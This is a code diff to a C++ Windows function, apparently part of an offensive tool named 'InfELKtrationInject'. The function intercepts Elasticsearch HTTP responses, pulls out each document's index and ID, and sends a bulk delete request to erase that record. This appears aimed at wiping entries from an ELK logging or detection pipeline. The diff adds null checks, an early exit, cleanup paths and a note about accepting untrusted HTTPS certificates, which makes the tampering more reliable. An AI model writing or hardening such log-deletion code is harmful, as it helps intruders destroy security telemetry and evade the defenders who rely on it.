@@ -32,8 +32,9 @@ void HttpIntercept(PCSTR reqBytes, PCSTR respBytes, PCSTR apiKey) {
 	BOOL needToDelete = false;
 	HINTERNET hSession, hConnect, hRequest;
 	LPVOID postBody;
-	size_t off1, off2, len;
+	size_t off1, off2;
 	PCSTR tmp, tmp2;
+	DWORD len;
 
 	Logger::Info("Executing HTTP interception code");
 
@@ -49,6 +50,8 @@ void HttpIntercept(PCSTR reqBytes, PCSTR respBytes, PCSTR apiKey) {
 		}
 	}
 	
+	if (!needToDelete) return;
+	
 	// allocate mem for post body stuff
 	postBody = VirtualAlloc(NULL, POST_BODY_MAX_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (!postBody) {
@@ -58,8 +61,6 @@ void HttpIntercept(PCSTR reqBytes, PCSTR respBytes, PCSTR apiKey) {
 	}
 	memset(postBody, 0, POST_BODY_MAX_SIZE);
 
-	Logger::Info("starting parsing");
-	
 	// parse things out
 	// after the first occ of "_index":" and before " is the index
 	// after the first occ of ,"_id":" and before " is the id
@@ -68,7 +69,7 @@ void HttpIntercept(PCSTR reqBytes, PCSTR respBytes, PCSTR apiKey) {
 	if (!tmp) {
 		// this is ok sometimes, the first request every so often is a heartbeat to /
 		Logger::Warning("didn't find the index key in the resp body, aborting");
-		return;
+		goto dealloc;
 	}
 	off1 = tmp - respBytes + INDEX_KEY_LEN;
 	tmp2 = StrStrA(respBytes + off1, "\"");
@@ -76,6 +77,11 @@ void HttpIntercept(PCSTR reqBytes, PCSTR respBytes, PCSTR apiKey) {
 	memcpy_s((void*)((intptr_t)postBody + 0x500), 0x80, respBytes + off1 - 1, off2 - off1 + 1);
 	
 	tmp = StrStrA(respBytes, id_key);
+	if (!tmp) {
+		// this shouldn't be reached ever, but better safe than sorry
+		Logger::Error("failed to find ID in resp body, aborting");
+		goto dealloc;
+	}
 	off1 = tmp - respBytes + ID_KEY_LEN;
 	tmp2 = StrStrA(respBytes + off1, "\"");
 	off2 = tmp2 - respBytes;
@@ -83,11 +89,7 @@ void HttpIntercept(PCSTR reqBytes, PCSTR respBytes, PCSTR apiKey) {
 
 	// the index is at postBody+0x500, and the id is at postBody+0x580
 	sprintf_s((char*)postBody, 0x500, "{\"delete\":{\"_index\":\"%s\",\"_id\":\"%s\"}}\n", (char*)postBody + 0x500, (char*)postBody + 0x580);
-	len = strlen((char*)postBody);
-
-	Logger::Info("POST Body (len=%d): %s", len, postBody);
-
-	if (!needToDelete) return;
+	len = (DWORD)strlen((char*)postBody);
 
 	// start an HTTP session
 	hSession = WinHttpOpen(L"InfELKtrationInject/1.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, NULL);
@@ -128,11 +130,15 @@ void HttpIntercept(PCSTR reqBytes, PCSTR respBytes, PCSTR apiKey) {
 	}
 
 	// send the http request
+	// TODO make this resilient to an untrusted HTTPS cert
+	// https://stackoverflow.com/a/19693449
 	if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, NULL, postBody, len, len, NULL)) {
 		Logger::Error("WinHttpSendRequest failed");
 		Logger::LastError();
 		goto closeReq;
 	}
+
+	Logger::Info("Deleted ES document %s", (char*)postBody + 0x580);
 
 closeReq:
 	WinHttpCloseHandle(hRequest);
@@ -140,6 +146,6 @@ closeConn:
 	WinHttpCloseHandle(hConnect);
 closeSess:
 	WinHttpCloseHandle(hSession);
-	
+dealloc:
 	VirtualFree(postBody, NULL, MEM_RELEASE);
 }
